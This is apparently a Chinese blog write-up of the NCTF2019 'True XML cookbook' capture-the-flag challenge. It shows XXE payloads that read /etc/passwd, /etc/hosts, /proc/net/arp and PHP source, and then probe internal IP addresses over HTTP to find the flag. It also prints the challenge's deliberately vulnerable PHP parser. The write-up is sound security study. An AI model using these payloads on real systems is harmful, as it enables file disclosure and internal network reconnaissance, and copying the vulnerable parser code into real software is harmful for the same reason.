---

title: 日常练习27——XML注入之探测内网

date: 2021-04-30 23:47:01

tags: 练习

categories: test76

---
这道题目是还是xml外部实体注入，只不过扩展了xml注入的攻击手段。这次的xml注入是关于内网探测的攻击。  

# [NCTF2019]True XML cookbook  

打开题目，是一个登录界面，题目已经提示是xml了，那么直接抓包看看。  

[![](https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png)](https://img.imgdb.cn/item/608cd4cad1a9ae528f5a204a.png)  

确实是xml的代码格式。可以直接把上一道题目的payload打上去试试。  

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "file:///etc/passwd">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>    

发现确实可用，但是不能直接用file://协议读取flag。  

[![](https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png)](https://img.imgdb.cn/item/608cd584d1a9ae528f608cbf.png)  

那么我们先读取一下它的源码

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./doLogin.php">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>    

确实能读到，但是解码后发现没什么用处。  

	<?php
	/**
	* autor: c0ny1
	* date: 2018-2-7
	*/
	
	$USERNAME = 'admin'; //账号
	$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
	$result = null;
	
	libxml_disable_entity_loader(false);
	$xmlfile = file_get_contents('php://input');
	
	try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
	}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
	}
	
	header('Content-Type: text/html; charset=utf-8');
	echo $result;
	?>

所以这道题考察的不是xml注入file://协议读取文件了，而是内网探测。  

我们可以通过xml注入来探测主机ip地址，如下所示：  

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "file:///etc/hosts">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>

这里的etc/hosts也是一个很重要的文件，它包含了主机名和ip配置文件。  

[![](https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png)](https://img.imgdb.cn/item/608cd73dd1a9ae528f6fee31.png)  

可以看到主机ip，但是看不到目标主机的ip，这里我们可以读取另一个和ip相关的文件——/proc/net/arp。   

	详细介绍:
	/proc/net/arp

 

    IP address HW type Flags HW address Mask Device

		192.168.1.151 0x1 0x2 00:e0:4c:19:1a:98 * eth0
	
	    192.168.1.1 0x1 0x2 00:14:78:e7:c4:e8 * eth0
     

    每个网络接口的arp表中dev包的统计

    IP address：IP地址（直连）

    HW type：硬件类型

    23=0x17 strip (Metricom Starmode IP)

    01=0x01 ether (Ethernet)

    15=0xf dlci (Frame Relay DLCI)

    Flags：

    HW address：MAC 地址

    Mask：

    Device：所在网络接口

这两个文件都是和主机地址相关的重要文件，我们读取这个文件可以看到目标主机ip地址。   

[![](https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png)](https://img.imgdb.cn/item/608cd874d1a9ae528f7a996f.png)  

ip地址为10.0.228.2，我们读取一下这个ip：  

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "http://10.0.228.2">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>  

[![](https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png)](https://img.imgdb.cn/item/608cd905d1a9ae528f7f67d2.png)  

发现这个ip读取不了，我们可以一个个的试ip地址，最后发现当ip最后一位为11时，能够成功读取，从而获得flag。  

[![](https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png)](https://img.imgdb.cn/item/608cda63d1a9ae528f8b9db1.png)  

我们也可以用爆破来得到存活的ip地址：   

[![](https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png)](https://img.imgdb.cn/item/608cdb3ad1a9ae528f93cb33.png)  

# 小结  

其实关于xml外部实体注入还有很多攻击方法，或者说是用法，现在已经学到了读取文件和探测主机，下面会附上其他用法，以后遇到要多做积累。  

[XXE漏洞（XML外部实体注入）](https://blog.csdn.net/whoim_i/article/details/104370532?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161984410316780262525304%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161984410316780262525304&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-104370532.first_rank_v2_pc_rank_v29&utm_term=xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4449)  
  
